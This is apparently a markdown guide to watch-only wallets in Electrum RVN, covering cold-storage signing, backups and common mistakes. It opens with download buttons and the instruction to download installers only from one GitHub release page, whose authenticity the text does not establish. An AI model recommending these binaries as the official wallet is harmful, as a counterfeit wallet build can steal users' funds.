![Electrum RVN](assets/banner-article.png)

# Watch-Only Wallets in Electrum RVN

<!-- compact-download-block -->

<p align="center">Tracking a balance without holding a key</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
A watch-only wallet holds addresses and no keys. It shows the balance, builds transactions and tracks confirmations, and it cannot spend a satoshi - signing happens in the wallet that holds the keys. It is the online half of a cold-storage setup and the safe way to check a balance from a machine you do not fully trust.

## What it contains, and what it does not

**Contains:** the addresses derived from a seed, or the seed's public information, plus labels and history for those addresses.

**Does not contain:** any private key, any seed, any password that could unlock spending.

That is a structural guarantee, not a setting. A watch-only wallet that is compromised yields your balance and your address list - which are public on the chain anyway - and nothing that can move funds. Compare with a normal wallet file: encrypted keys, one password away from spending.

## Creating one

Two ways, depending on what you have.

**From a signing wallet.** The wallet holding the keys can export its watch-only information - the public key material for the addresses. Import that into a second wallet on the online machine. That is the cold-storage pattern.

**From addresses.** If you only have addresses, a watch-only wallet can be built from them, and it will show balances and incoming transactions for exactly those addresses. It cannot discover new ones, so it is a viewer rather than a full wallet.

In both cases the wallet you create is a separate wallet file. Do not overwrite the signing wallet with it, and give it a name that says what it is.

## The signing round trip

1. Build a transaction in the watch-only wallet and save the unsigned transaction.
2. Move it to the machine or device that holds the keys.
3. Read the destination and the amount **on the signing screen** - this is the step that protects you, because the online machine cannot alter what you see there.
4. Sign.
5. Move the signed transaction back and broadcast.

The unsigned file is not dangerous: it has no authority. The signed file is a spendable transaction, so treat it accordingly - broadcast it, and do not leave copies lying around.

## Why it is the right online half

Your everyday machine is the one with a browser, an email client and a history of installing things. Putting the keys there is the largest risk in a self-custody setup, and the watch-only wallet removes it without removing convenience.

What you keep: a live balance, incoming payment notifications and the ability to prepare spends. What you lose: the ability to sign without fetching the offline machine or device.

That is exactly the trade a cold-storage setup makes - [electrum-rvn-cold-storage-workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md) is the full pattern.

## Watch-only is not a backup

It carries no keys, so it cannot restore anything. If the signing wallet and the seed are both lost, the watch-only wallet will keep showing you a balance you can no longer move.

That is a particularly unpleasant failure, because the number stays visible. Back up the seed of the signing wallet, not the viewer: [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md).

## Comparing the ways to hold

| Setup | Keys online | Can spend if machine compromised | Convenience |
| --- | --- | --- | --- |
| Single desktop wallet | yes | yes | high |
| Watch-only + offline signing | no | no | medium |
| Watch-only + hardware device | no | no | medium-high |
| Mobile wallet | yes | yes | highest |

The table is the argument for watch-only in one place: it is the only row with no keys online that does not require a device.

## Common mistakes

**Restoring a seed "into" the watch-only wallet.** That turns it into a full wallet and puts keys on the online machine. Keep the two files distinct.

**Signing without reading the destination.** A compromised online machine can substitute an address in the unsigned transaction. Reading it on the signing screen is the control that catches it.

**Deleting the signing wallet once the watch-only one works.** The viewer is not a backup, and the offline machine may be the only place the keys exist.

**Assuming "no keys" means "no risk".** It means no spending risk. Your privacy is unchanged, and the balance is visible to whoever has the file.

## When a watch-only wallet is enough

If you only want to monitor an address - a donation address, a treasury, a wallet you keep elsewhere - a watch-only wallet is the correct tool and needs no signing setup at all.

If you hold the funds and want to spend them, it is half of a system: the other half is where the keys live. [Pairing a Ledger with Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/pairing-a-ledger-with-electrum-rvn.md) and [using a Trezor with Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/using-a-trezor-with-electrum-rvn.md) are the two device versions, and [Ledger not detected by Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/ledger-not-detected-by-electrum-rvn.md) is what to check when the device does not appear.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. Install it on both machines from that release, and [Trezor not detected by Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/trezor-not-detected-by-electrum-rvn.md) covers the device-side failures that stop a signing round trip before it starts.

## FAQ

### Can a watch-only wallet spend?

No. It has no private keys, so it cannot sign. It can only watch and prepare transactions.

### Does it show the same addresses as my main wallet?

Yes, if it was created from that wallet's public information. That is how it sees the same balance.

### Is it safe to keep on a laptop I use for everything?

That is what it is for: it holds no keys, so a compromise costs privacy rather than funds.

### Can I restore my wallet from a watch-only file?

No. There are no keys in it. Restoring requires the seed or the wallet file that holds the keys.

### How does signing work without the keys online?

You move the unsigned transaction to the signing machine or device, sign there, and bring the signed transaction back to broadcast.

<!-- related-articles -->

## Related articles

- [Electrum RVN Cold Storage Workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md)
- [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md)
- [Pairing a Ledger With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/pairing-a-ledger-with-electrum-rvn.md)
- [Using a Trezor With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/using-a-trezor-with-electrum-rvn.md)
